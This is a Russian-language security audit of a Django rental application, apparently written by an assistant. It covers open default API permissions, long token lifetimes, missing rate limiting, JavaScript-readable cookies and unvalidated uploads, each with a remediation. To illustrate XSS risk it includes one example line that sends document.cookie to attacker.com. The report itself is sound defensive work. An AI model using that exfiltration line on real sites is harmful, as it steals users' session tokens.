# 🔒 АНАЛИЗ БЕЗОПАСНОСТИ ДАННЫХ ПОЛЬЗОВАТЕЛЕЙ

**Дата:** 09.10.2025  
**Текущая оценка:** 5.0/10 ⚠️

---

## 🔴 КРИТИЧЕСКИЕ УЯЗВИМОСТИ

### 1. **DEFAULT_PERMISSION_CLASSES: AllowAny** ⛔

**Файл:** `backend/myproject/settings.py` строка 144

```python
REST_FRAMEWORK = {
    'DEFAULT_PERMISSION_CLASSES': [
        'rest_framework.permissions.AllowAny',  # ❌ ВСЕ API ОТКРЫТЫ!
    ],
}
```

**Риск:**
- Все endpoints доступны без аутентификации по умолчанию
- Разработчики могут забыть добавить `@permission_classes([IsAuthenticated])`
- Данные пользователей доступны всем

**Решение:**
```python
REST_FRAMEWORK = {
    'DEFAULT_PERMISSION_CLASSES': [
        'rest_framework.permissions.IsAuthenticated',  # ✅ Безопасно
    ],
}
```

**Действия после изменения:**
- Добавить `@permission_classes([AllowAny])` к публичным endpoints:
  - `/api/register/`
  - `/api/login/`
  - `/api/auth/google/`

---

### 2. **Слишком долгий lifetime токенов** 🕐

**Файл:** `backend/myproject/settings.py` строка 135

```python
SIMPLE_JWT = {
    'ACCESS_TOKEN_LIFETIME': timedelta(minutes=300),  # ❌ 5 ЧАСОВ!
    'REFRESH_TOKEN_LIFETIME': timedelta(days=3),
}
```

**Риск:**
- Украденный токен действителен 5 часов
- XSS атака может украсть токен из cookies (httponly=False)
- Невозможно быстро отозвать доступ

**Решение:**
```python
SIMPLE_JWT = {
    'ACCESS_TOKEN_LIFETIME': timedelta(minutes=30),  # ✅ 30 минут
    'REFRESH_TOKEN_LIFETIME': timedelta(days=7),     # ✅ 7 дней
    'ROTATE_REFRESH_TOKENS': True,
    'BLACKLIST_AFTER_ROTATION': True,
}
```

---

### 3. **Отсутствие Rate Limiting** 🚨

**Файл:** `backend/rentapp/views/auth.py`

```python
@api_view(['POST'])
@permission_classes([AllowAny])
def login_view(request):  # ❌ НЕТ ЗАЩИТЫ ОТ БРУТФОРСА!
    username = request.data.get('username')
    password = request.data.get('password')
    user = authenticate(request, username=username, password=password)
```

**Риск:**
- Брутфорс паролей (1000+ попыток в минуту)
- DDoS атаки на критические endpoints
- Enumeration атаки (проверка существующих username)

**Решение:**

Установлен `django-ratelimit==4.1.0` ✅, но НЕ используется!

```python
from django_ratelimit.decorators import ratelimit

@ratelimit(key='ip', rate='5/m', method='POST')  # ✅ 5 попыток в минуту
@api_view(['POST'])
@permission_classes([AllowAny])
def login_view(request):
    if getattr(request, 'limited', False):
        return Response({
            'error': 'Слишком много попыток. Попробуйте через минуту.'
        }, status=status.HTTP_429_TOO_MANY_REQUESTS)
    # ... остальной код
```

**Критические endpoints для защиты:**
- `/api/login/` - 5 попыток/минуту
- `/api/register/` - 3 попытки/час
- `/api/password-reset/` - 3 попытки/час

---

### 4. **httponly=False в cookies** 💀

**Файл:** `backend/rentapp/views/auth.py` строки 182, 193

```python
response.set_cookie(
    key='access_token',
    value=access_token,
    httponly=False,  # ❌ JavaScript может читать токен!
    ...
)
```

**Риск:**
- XSS атаки могут украсть токены через `document.cookie`
- Вредоносные скрипты получают полный доступ к аккаунту
- Одна XSS уязвимость = полная компрометация

**Пример атаки:**
```javascript
// Вредоносный скрипт:
fetch('https://attacker.com/steal?token=' + document.cookie);
```

**⚠️ ПРОБЛЕМА:** С вашей текущей архитектурой httpOnly=True не работает из-за cross-origin issues.

**Решения:**

**Вариант А (Быстрый):** XSS защита без httpOnly
```python
# 1. Content Security Policy
# backend/myproject/settings.py
MIDDLEWARE = [
    ...
    'csp.middleware.CSPMiddleware',  # pip install django-csp
]

CSP_DEFAULT_SRC = ("'self'",)
CSP_SCRIPT_SRC = ("'self'", "'unsafe-inline'")  # Минимизировать unsafe-inline
CSP_STYLE_SRC = ("'self'", "'unsafe-inline'")
CSP_CONNECT_SRC = ("'self'", "https://api.arno.kz")

# 2. Escape все user input в frontend
# front/src/components/...
import DOMPurify from 'dompurify';
const clean = DOMPurify.sanitize(userInput);
```

**Вариант Б (Правильный):** Nginx Reverse Proxy
```nginx
# Запускать frontend и backend на одном домене через Nginx
server {
    listen 80;
    server_name localhost;
    
    location / {
        proxy_pass http://localhost:3000;  # Frontend
    }
    
    location /api/ {
        proxy_pass http://localhost:8000;  # Backend
    }
}
```

Тогда можно включить httpOnly=True!

---

## 🟠 ВЫСОКИЙ ПРИОРИТЕТ

### 5. **Отсутствие логирования безопасности** 📝

**Риск:**
- Невозможно отследить попытки взлома
- Нет мониторинга подозрительной активности
- Невозможно провести forensics после инцидента

**Решение:**

```python
# backend/myproject/settings.py
import os

LOGS_DIR = os.path.join(BASE_DIR, 'logs')
os.makedirs(LOGS_DIR, exist_ok=True)

LOGGING = {
    'version': 1,
    'disable_existing_loggers': False,
    'formatters': {
        'security': {
            'format': '{asctime} | {levelname} | {message} | IP: {ip} | User: {user}',
            'style': '{',
        },
    },
    'handlers': {
        'security_file': {
            'level': 'WARNING',
            'class': 'logging.handlers.RotatingFileHandler',
            'filename': os.path.join(LOGS_DIR, 'security.log'),
            'maxBytes': 10 * 1024 * 1024,  # 10MB
            'backupCount': 5,
            'formatter': 'security',
        },
    },
    'loggers': {
        'security': {
            'handlers': ['security_file'],
            'level': 'WARNING',
            'propagate': False,
        },
    },
}
```

```python
# backend/rentapp/views/auth.py
import logging
security_logger = logging.getLogger('security')

def login_view(request):
    username = request.data.get('username')
    ip = request.META.get('REMOTE_ADDR', 'unknown')
    
    user = authenticate(request, username=username, password=password)
    
    if user is not None:
        security_logger.info(
            f"Успешный вход: {username}",
            extra={'ip': ip, 'user': username}
        )
    else:
        security_logger.warning(
            f"Неудачная попытка входа: {username}",
            extra={'ip': ip, 'user': username}
        )
```

---

### 6. **Недостаточная валидация загружаемых файлов** 📁

**Файл:** `backend/rentapp/models.py`

```python
class RentalComplaint(models.Model):
    evidence = models.FileField(upload_to='evidence/')  # ❌ Любые файлы!
```

**Риск:**
- Загрузка вредоносных файлов (.exe, .php, .sh)
- Переполнение диска
- RCE если файлы выполняются

**Решение:**

```python
# backend/rentapp/validators.py
from django.core.exceptions import ValidationError
from django.core.validators import FileExtensionValidator

def validate_file_size(file):
    max_size = 5 * 1024 * 1024  # 5MB
    if file.size > max_size:
        raise ValidationError('Файл слишком большой (макс 5MB)')

def validate_image(file):
    from PIL import Image
    try:
        img = Image.open(file)
        img.verify()
    except:
        raise ValidationError('Недопустимый формат изображения')

# backend/rentapp/models.py
class RentalComplaint(models.Model):
    evidence = models.FileField(
        upload_to='evidence/',
        validators=[
            FileExtensionValidator(['pdf', 'jpg', 'jpeg', 'png', 'doc', 'docx']),
            validate_file_size,
        ]
    )
```

---

## 🟡 СРЕДНИЙ ПРИОРИТЕТ

### 7. **SameSite='Lax' вместо 'Strict'** 🔐

```python
response.set_cookie(
    ...
    samesite='Lax',  # ⚠️ Менее безопасно
)
```

**Решение:**
```python
response.set_cookie(
    ...
    samesite='Strict',  # ✅ Для production
)
```

---

### 8. **Отсутствие HTTPS Strict Transport Security** 🔒

**Файл:** `backend/myproject/settings.py`

```python
SECURE_HSTS_SECONDS = 3600  # ⚠️ Только 1 час
```

**Решение:**
```python
if not DEBUG:
    SECURE_SSL_REDIRECT = True
    SECURE_HSTS_SECONDS = 31536000  # ✅ 1 год
    SECURE_HSTS_INCLUDE_SUBDOMAINS = True
    SECURE_HSTS_PRELOAD = True
```

---

## ✅ ЧТО УЖЕ ЗАЩИЩЕНО

1. ✅ Пароли хешируются (Django PBKDF2)
2. ✅ CORS настроен правильно
3. ✅ CSRF защита включена
4. ✅ `.env` в `.gitignore`
5. ✅ JWT Rotation включен
6. ✅ Ограничение размера файлов (5MB)

---

## 🎯 ПЛАН ДЕЙСТВИЙ (ПРИОРИТЕТ)

### 🔴 КРИТИЧНО (Сделать СРОЧНО)

**1. Изменить DEFAULT_PERMISSION_CLASSES** (15 минут)
```bash
# Файл: backend/myproject/settings.py
'DEFAULT_PERMISSION_CLASSES': [
    'rest_framework.permissions.IsAuthenticated',
],
```

**2. Добавить Rate Limiting** (30 минут)
```python
# Установить: pip install django-ratelimit (уже есть!)
# Добавить декораторы к login, register, password-reset
```

**3. Сократить token lifetime** (5 минут)
```python
'ACCESS_TOKEN_LIFETIME': timedelta(minutes=30),  # Было 300
```

**4. Добавить логирование** (1 час)
```python
# Настроить LOGGING в settings.py
# Добавить security_logger в auth.py
```

### 🟠 ВЫСОКИЙ ПРИОРИТЕТ (На этой неделе)

**5. Валидация файлов** (1 час)
**6. Content Security Policy** (30 минут)
**7. Мониторинг логов** (1 час)

### 🟡 СРЕДНИЙ ПРИОРИТЕТ (В этом месяце)

**8. SameSite=Strict**
**9. HSTS улучшение**
**10. Automated security scanning**

---

## 📊 ОЦЕНКА ПОСЛЕ ИСПРАВЛЕНИЙ

| Параметр | До | После |
|----------|----|----|
| **Оценка** | 5.0/10 | **7.5/10** ✅ |
| **XSS защита** | Слабая | Средняя |
| **Брутфорс** | Нет защиты | Защищено |
| **API Security** | Открыто | Закрыто |
| **Token lifetime** | 5 часов | 30 минут |

**Улучшение:** +50%

---

## 🚀 БЫСТРЫЙ СТАРТ

**Хотите начать?** Я могу внедрить **TOP-3 критических исправления**:
1. DEFAULT_PERMISSION_CLASSES
2. Rate Limiting  
3. Token Lifetime

**Время:** ~1 час  
**Результат:** Оценка повысится с 5.0 до 6.5

Начинаем? 🎯

